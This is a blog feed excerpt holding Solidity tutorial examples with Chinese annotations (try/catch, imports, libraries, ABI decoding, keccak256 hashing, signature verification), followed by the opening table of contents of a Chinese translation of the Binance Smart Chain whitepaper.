<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// External contract used for try / catch examples</span></span><br><span class="line">contract <span class="title class_">Foo</span> &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _owner</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(_owner != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;invalid address&quot;</span>);</span><br><span class="line">        <span class="title function_">assert</span>(_owner != <span class="number">0x0000000000000000000000000000000000000001</span>);</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">myFunc</span>(<span class="params">uint x</span>) public pure returns (string memory) &#123;</span><br><span class="line">        <span class="built_in">require</span>(x != <span class="number">0</span>, <span class="string">&quot;require failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;my func was called&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Bar</span> &#123;</span><br><span class="line">    event <span class="title class_">Log</span>(string message);</span><br><span class="line">    event <span class="title class_">LogBytes</span>(bytes data);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Foo</span> public foo;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// This Foo contract is used for example of try catch with external call</span></span><br><span class="line">        foo = <span class="keyword">new</span> <span class="title class_">Foo</span>(msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Example of try / catch with external call</span></span><br><span class="line">    <span class="comment">// tryCatchExternalCall(0) =&gt; Log(&quot;external call failed&quot;)</span></span><br><span class="line">    <span class="comment">// tryCatchExternalCall(1) =&gt; Log(&quot;my func was called&quot;)</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tryCatchExternalCall</span>(<span class="params">uint _i</span>) public &#123;</span><br><span class="line">        <span class="keyword">try</span> foo.<span class="title function_">myFunc</span>(_i) returns (string memory result) &#123;</span><br><span class="line">            emit <span class="title class_">Log</span>(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            emit <span class="title class_">Log</span>(<span class="string">&quot;external call failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Example of try / catch with contract creation</span></span><br><span class="line">    <span class="comment">// tryCatchNewContract(0x0000000000000000000000000000000000000000) =&gt; Log(&quot;invalid address&quot;)</span></span><br><span class="line">    <span class="comment">// tryCatchNewContract(0x0000000000000000000000000000000000000001) =&gt; LogBytes(&quot;&quot;)</span></span><br><span class="line">    <span class="comment">// tryCatchNewContract(0x0000000000000000000000000000000000000002) =&gt; Log(&quot;Foo created&quot;)</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tryCatchNewContract</span>(<span class="params">address _owner</span>) public &#123;</span><br><span class="line">        <span class="keyword">try</span> <span class="keyword">new</span> <span class="title class_">Foo</span>(_owner) returns (<span class="title class_">Foo</span> foo) &#123;</span><br><span class="line">            <span class="comment">// you can use variable foo here</span></span><br><span class="line">            emit <span class="title class_">Log</span>(<span class="string">&quot;Foo created&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> <span class="title class_">Error</span>(string memory reason) &#123;</span><br><span class="line">            <span class="comment">// catch failing revert() and require()</span></span><br><span class="line">            emit <span class="title class_">Log</span>(reason);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (bytes memory reason) &#123;</span><br><span class="line">            <span class="comment">// catch failing assert()</span></span><br><span class="line">            emit <span class="title class_">LogBytes</span>(reason);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Import:</h1>
<p>You can import local and external files in Solidity.</p>
<h2 id="Local">Local</h2>
<p>Here is our folder structure.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── Import.sol</span><br><span class="line">└── Foo.sol</span><br></pre></td></tr></table></figure>
<p>Foo.sol</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">struct <span class="title class_">Point</span> &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    uint y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error <span class="title class_">Unauthorized</span>(address caller);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">uint x, uint y</span>) pure returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Foo</span> &#123;</span><br><span class="line">    string public name = <span class="string">&quot;Foo&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Import.sol:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// import Foo.sol from current directory</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Foo.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// import &#123;symbol1 as alias, symbol2&#125; from &quot;filename&quot;;</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Unauthorized</span>, add <span class="keyword">as</span> func, <span class="title class_">Point</span>&#125; <span class="keyword">from</span> <span class="string">&quot;./Foo.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Import</span> &#123;</span><br><span class="line">    <span class="comment">// Initialize Foo.sol</span></span><br><span class="line">    <span class="title class_">Foo</span> public foo = <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Test Foo.sol by getting it&#x27;s name.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getFooName</span>(<span class="params"></span>) public view returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> foo.<span class="title function_">name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="External">External:</h2>
<p>You can also import from GitHub by simply copying the url</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://github.com/owner/repo/blob/branch/path/to/Contract.sol</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;https://github.com/owner/repo/blob/branch/path/to/Contract.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Example import ECDSA.sol from openzeppelin-contract repo, release-v4.5 branch</span></span><br><span class="line"><span class="comment">// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol&quot;</span>;</span><br></pre></td></tr></table></figure>
<h1>Library:</h1>
<p>Libraries are similar to contracts, but you can’t declare any state variable and you can’t send ether.<br />
A library is embedded into the contract if all library functions are internal.<br />
Otherwise the library must be deployed and then linked before the contract is deployed.</p>
<p>库类似于合约，但你不能声明任何状态变量，也不能发送以太币。如果所有库函数都是内部的，则将库嵌入到合约中。否则，必须先部署库，然后在部署合约之前进行链接。</p>
<p>抽象一层，抽出代码块。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">library <span class="title class_">SafeMath</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">uint x, uint y</span>) internal pure returns (uint) &#123;</span><br><span class="line">        uint z = x + y;</span><br><span class="line">        <span class="built_in">require</span>(z &gt;= x, <span class="string">&quot;uint overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> z;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library <span class="title class_">Math</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sqrt</span>(<span class="params">uint y</span>) internal pure returns (uint z) &#123;</span><br><span class="line">        <span class="keyword">if</span> (y &gt; <span class="number">3</span>) &#123;</span><br><span class="line">            z = y;</span><br><span class="line">            uint x = y / <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (x &lt; z) &#123;</span><br><span class="line">                z = x;</span><br><span class="line">                x = (y / x + x) / <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (y != <span class="number">0</span>) &#123;</span><br><span class="line">            z = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// else z = 0 (default value)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TestSafeMath</span> &#123;</span><br><span class="line">    using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint;</span><br><span class="line"></span><br><span class="line">    uint public <span class="variable constant_">MAX_UINT</span> = <span class="number">2</span>**<span class="number">256</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testAdd</span>(<span class="params">uint x, uint y</span>) public pure returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> x.<span class="title function_">add</span>(y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testSquareRoot</span>(<span class="params">uint x</span>) public pure returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Array function to delete element at index and re-organize the array</span></span><br><span class="line"><span class="comment">// so that their are no gaps between the elements.</span></span><br><span class="line">library <span class="title class_">Array</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">remove</span>(<span class="params">uint[] storage arr, uint index</span>) public &#123;</span><br><span class="line">        <span class="comment">// Move the last element into the place to delete</span></span><br><span class="line">        <span class="built_in">require</span>(arr.<span class="property">length</span> &gt; <span class="number">0</span>, <span class="string">&quot;Can&#x27;t remove from empty array&quot;</span>);</span><br><span class="line">        arr[index] = arr[arr.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">        arr.<span class="title function_">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TestArray</span> &#123;</span><br><span class="line">    using <span class="title class_">Array</span> <span class="keyword">for</span> uint[];</span><br><span class="line"></span><br><span class="line">    uint[] public arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testArrayRemove</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            arr.<span class="title function_">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        arr.<span class="title function_">remove</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">assert</span>(arr.<span class="property">length</span> == <span class="number">2</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">0</span>] == <span class="number">0</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">1</span>] == <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>ABI Decode:</h1>
<p><code>abi.encode</code> encodes data into bytes.<br />
<code>abi.decode</code> decodes bytes back into data.</p>
<p>类似base64编码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AbiDecode</span> &#123;</span><br><span class="line">    struct <span class="title class_">MyStruct</span> &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint[<span class="number">2</span>] nums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">encode</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint x,</span></span><br><span class="line"><span class="params">        address addr,</span></span><br><span class="line"><span class="params">        uint[] calldata arr,</span></span><br><span class="line"><span class="params">        MyStruct calldata myStruct</span></span><br><span class="line"><span class="params">    </span>) external pure returns (bytes memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> abi.<span class="title function_">encode</span>(x, addr, arr, myStruct);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">decode</span>(<span class="params">bytes calldata data</span>)</span><br><span class="line">        external</span><br><span class="line">        pure</span><br><span class="line">        returns (</span><br><span class="line">            uint x,</span><br><span class="line">            address addr,</span><br><span class="line">            uint[] memory arr,</span><br><span class="line">            <span class="title class_">MyStruct</span> memory myStruct</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// (uint x, address addr, uint[] memory arr, MyStruct myStruct) = ...</span></span><br><span class="line">        (x, addr, arr, myStruct) = abi.<span class="title function_">decode</span>(data, (uint, address, uint[], <span class="title class_">MyStruct</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Hashing with Keccak256:</h1>
<p>keccak256 computes the Keccak-256 hash of the input. 一个哈希算法罢了。</p>
<p>Some use cases are:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Creating a deterministic unique ID from a input 从输入创建确定性唯一ID,例如订单id</p>
</li>
<li class="lvl-2">
<p>Commit-Reveal scheme 应该是提交-验证方案，类似登录密码md5哈希加密</p>
</li>
<li class="lvl-2">
<p>Compact cryptographic signature (by signing the hash instead of a larger input) 紧凑的加密签名（通过签名散列，而不是更大的输入）</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">HashFunction</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hash</span>(<span class="params"></span></span><br><span class="line"><span class="params">        string memory _text,</span></span><br><span class="line"><span class="params">        uint _num,</span></span><br><span class="line"><span class="params">        address _addr</span></span><br><span class="line"><span class="params">    </span>) public pure returns (bytes32) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(_text, _num, _addr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Example of hash collision</span></span><br><span class="line">    <span class="comment">// Hash collision can occur when you pass more than one dynamic data type</span></span><br><span class="line">    <span class="comment">// to abi.encodePacked. In such case, you should use abi.encode instead.</span></span><br><span class="line">    <span class="comment">// abi.encodePacked 紧打包可能会有哈希碰撞问题</span></span><br><span class="line">    <span class="comment">// 在这种情况下，建议用abi.encode</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">collision</span>(<span class="params">string memory _text, string memory _anotherText</span>)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        returns (bytes32)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// encodePacked(AAA, BBB) -&gt; AAABBB</span></span><br><span class="line">        <span class="comment">// encodePacked(AA, ABBB) -&gt; AAABBB</span></span><br><span class="line">        <span class="comment">// Oh,哈希碰撞</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(_text, _anotherText));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GuessTheMagicWord</span> &#123;</span><br><span class="line">    bytes32 public answer = <span class="number">0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Magic word is &quot;Solidity&quot;</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">string memory _word</span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(_word)) == answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Verifying Signature:</h1>
<p>Messages can be signed off chain and then verified on chain using a smart contract.<br />
消息可以在链下签名，然后使用智能合约在链上进行验证。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Signature Verification</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">How to Sign and Verify</span></span><br><span class="line"><span class="comment"># Signing</span></span><br><span class="line"><span class="comment">1. Create message to sign</span></span><br><span class="line"><span class="comment">2. Hash the message</span></span><br><span class="line"><span class="comment">3. Sign the hash (off chain, keep your private key secret)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># Verify</span></span><br><span class="line"><span class="comment">1. Recreate hash from the original message</span></span><br><span class="line"><span class="comment">2. Recover signer from signature and hash</span></span><br><span class="line"><span class="comment">3. Compare recovered signer to claimed signer</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">contract <span class="title class_">VerifySignature</span> &#123;</span><br><span class="line">    <span class="comment">/* 1. Unlock MetaMask account</span></span><br><span class="line"><span class="comment">    ethereum.enable()</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 2. Get message hash to sign</span></span><br><span class="line"><span class="comment">    getMessageHash(</span></span><br><span class="line"><span class="comment">        0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C,</span></span><br><span class="line"><span class="comment">        123,</span></span><br><span class="line"><span class="comment">        &quot;coffee and donuts&quot;,</span></span><br><span class="line"><span class="comment">        1</span></span><br><span class="line"><span class="comment">    )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    hash = &quot;0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd&quot;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getMessageHash</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _to,</span></span><br><span class="line"><span class="params">        uint _amount,</span></span><br><span class="line"><span class="params">        string memory _message,</span></span><br><span class="line"><span class="params">        uint _nonce</span></span><br><span class="line"><span class="params">    </span>) public pure returns (bytes32) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(_to, _amount, _message, _nonce));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 3. Sign message hash</span></span><br><span class="line"><span class="comment">    # using browser</span></span><br><span class="line"><span class="comment">    account = &quot;copy paste account of signer here&quot;</span></span><br><span class="line"><span class="comment">    ethereum.request(&#123; method: &quot;personal_sign&quot;, params: [account, hash]&#125;).then(console.log)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    # using web3</span></span><br><span class="line"><span class="comment">    web3.personal.sign(hash, web3.eth.defaultAccount, console.log)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Signature will be different for different accounts</span></span><br><span class="line"><span class="comment">    0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getEthSignedMessageHash</span>(<span class="params">bytes32 _messageHash</span>)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        returns (bytes32)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Signature is produced by signing a keccak256 hash with the following format:</span></span><br><span class="line"><span class="comment">        &quot;\x19Ethereum Signed Message\n&quot; + len(msg) + msg</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">            <span class="title function_">keccak256</span>(</span><br><span class="line">                abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;\x19Ethereum Signed Message:\n32&quot;</span>, _messageHash)</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 4. Verify signature</span></span><br><span class="line"><span class="comment">    signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd</span></span><br><span class="line"><span class="comment">    to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C</span></span><br><span class="line"><span class="comment">    amount = 123</span></span><br><span class="line"><span class="comment">    message = &quot;coffee and donuts&quot;</span></span><br><span class="line"><span class="comment">    nonce = 1</span></span><br><span class="line"><span class="comment">    signature =</span></span><br><span class="line"><span class="comment">        0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">verify</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _signer,</span></span><br><span class="line"><span class="params">        address _to,</span></span><br><span class="line"><span class="params">        uint _amount,</span></span><br><span class="line"><span class="params">        string memory _message,</span></span><br><span class="line"><span class="params">        uint _nonce,</span></span><br><span class="line"><span class="params">        bytes memory signature</span></span><br><span class="line"><span class="params">    </span>) public pure returns (bool) &#123;</span><br><span class="line">        bytes32 messageHash = <span class="title function_">getMessageHash</span>(_to, _amount, _message, _nonce);</span><br><span class="line">        bytes32 ethSignedMessageHash = <span class="title function_">getEthSignedMessageHash</span>(messageHash);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">recoverSigner</span>(ethSignedMessageHash, signature) == _signer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">recoverSigner</span>(<span class="params">bytes32 _ethSignedMessageHash, bytes memory _signature</span>)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        returns (address)</span><br><span class="line">    &#123;</span><br><span class="line">        (bytes32 r, bytes32 s, uint8 v) = <span class="title function_">splitSignature</span>(_signature);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">ecrecover</span>(_ethSignedMessageHash, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">splitSignature</span>(<span class="params">bytes memory sig</span>)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        returns (</span><br><span class="line">            bytes32 r,</span><br><span class="line">            bytes32 s,</span><br><span class="line">            uint8 v</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">require</span>(sig.<span class="property">length</span> == <span class="number">65</span>, <span class="string">&quot;invalid signature length&quot;</span>);</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            First 32 bytes stores the length of the signature</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            add(sig, 32) = pointer of sig + 32</span></span><br><span class="line"><span class="comment">            effectively, skips first 32 bytes of signature</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            mload(p) loads next 32 bytes starting at the memory address p into memory</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// first 32 bytes, after the length prefix</span></span><br><span class="line">            r := <span class="title function_">mload</span>(<span class="title function_">add</span>(sig, <span class="number">32</span>))</span><br><span class="line">            <span class="comment">// second 32 bytes</span></span><br><span class="line">            s := <span class="title function_">mload</span>(<span class="title function_">add</span>(sig, <span class="number">64</span>))</span><br><span class="line">            <span class="comment">// final byte (first byte of the next 32 bytes)</span></span><br><span class="line">            v := <span class="title function_">byte</span>(<span class="number">0</span>, <span class="title function_">mload</span>(<span class="title function_">add</span>(sig, <span class="number">96</span>)))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// implicitly return (r, s, v)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Document</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Document</tag>
      </tags>
  </entry>
  <entry>
    <title>Doc-币安智能链WhitePaper</title>
    <url>/2022/59484.html</url>
    <content><![CDATA[<h1>币安智能链</h1>
<blockquote>
<p>支持智能合约的平行币安链</p>
</blockquote>
<p>0.1 版本</p>
<p>2020/04/17</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="#%E5%8A%A8%E6%9C%BA">动机</a></p>
</li>
<li class="lvl-2">
<p><a href="#%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99">设计原则</a></p>
</li>
<li class="lvl-2">
<p><a href="#%E5%85%B1%E8%AF%86%E4%B8%8E%E9%AA%8C%E8%AF%81%E8%80%85%E7%9A%84%E4%BA%BA%E6%95%B0">共识与验证者的人数</a></p>
<ul class="lvl-2">
<li class="lvl-4"><a href="#%E5%9F%BA%E4%BA%8E%E6%9D%83%E7%9B%8A%E7%9A%84%E6%9D%83%E5%A8%81%E8%AF%81%E6%98%8E-proof-of-staked-authority">基于权益的权威证明 (Proof Of Staked Authority)</a></li>
<li class="lvl-4"><a href="#%E9%AA%8C%E8%AF%81%E4%BA%BA%E8%8A%82%E7%82%B9%E6%B3%95%E5%AE%9A%E4%BA%BA%E6%95%B0">验证人节点法定人数</a></li>
<li class="lvl-4"><a href="#%E5%AE%89%E5%85%A8%E4%B8%8E%E6%9C%80%E7%BB%88%E6%80%A7">安全与最终性</a></li>
<li class="lvl-4"><a href="#%E6%94%B6%E7%9B%8A">收益</a></li>
</ul>
</li>
<li class="lvl-2">
<p><a href="#%E4%BB%A3%E5%B8%81%E7%BB%8F%E6%B5%8E%E5%AD%A6">代币经济学</a></p>
<ul class="lvl-2">
<li class="lvl-4"><a href="#%E5%8E%9F%E7%94%9F%E4%BB%A3%E5%B8%81">原生代币</a></li>
<li class="lvl-4"><a href="#%E5%85%B6%E4%BB%96%E4%BB%A3%E5%B8%81">其他代币</a></li>
</ul>
</li>
<li class="lvl-2">
<p><a href="#%E8%B7%A8%E9%93%BE%E8%BD%AC%E8%B4%A6%E4%B8%8E%E9%80%9A%E4%BF%A1">跨链转账与通信</a></p>
<ul class="lvl-2">
<li class="lvl-4"><a href="#%E8%B7%A8%E9%93%BE%E8%BD%AC%E8%B4%A6">跨链转账</a></li>
<li class="lvl-4"><a href="#bc%E5%88%B0bsc%E6%9E%B6%E6%9E%84">BC到BSC架构</a></li>
<li class="lvl-4"><a href="#bsc%E5%88%B0bc-%E6%9E%B6%E6%9E%84">BSC到BC 架构</a></li>
<li class="lvl-4"><a href="#%E8%B6%85%E6%97%B6%E4%B8%8E%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">超时与错误处理</a></li>
<li class="lvl-4"><a href="#%E8%B7%A8%E9%93%BE%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C">跨链用户体验</a></li>
<li class="lvl-4"><a href="#%E8%B7%A8%E9%93%BE%E5%90%88%E7%BA%A6%E4%BA%8B%E4%BB%B6">跨链合约事件</a></li>
</ul>
</li>
<li class="lvl-2">
<p><a href="#%E6%9D%83%E7%9B%8A%E8%B4%A8%E6%8A%BC%E4%B8%8E%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86">权益质押与链上治理</a></p>
<ul class="lvl-2">
<li class="lvl-4"><a href="#bc%E6%9D%83%E7%9B%8A%E8%B4%A8%E6%8A%BC">BC权益质押</a></li>
<li class="lvl-4"><a href="#%E5%A5%96%E5%8A%B1">奖励</a></li>
<li class="lvl-4"><a href="#%E7%BD%9A%E6%81%AF">罚息</a></li>
</ul>
</li>
<li class="lvl-2">
<p><a href="#%E4%B8%AD%E7%BB%A7%E5%99%A8">中继器</a></p>
<ul class="lvl-2">
<li class="lvl-4"><a href="#bsc%E4%B8%AD%E7%BB%A7%E5%99%A8">BSC中继器</a>
<ul class="lvl-4">
<li class="lvl-6"><a href="#%E6%BF%80%E5%8A%B1">激励</a></li>
</ul>
</li>
<li class="lvl-4"><a href="#oracle%E4%B8%AD%E7%BB%A7%E5%99%A8">Oracle中继器</a></li>
</ul>
</li>
<li class="lvl-2">
<p><a href="#%E5%B1%95%E6%9C%9B">展望</a></p>
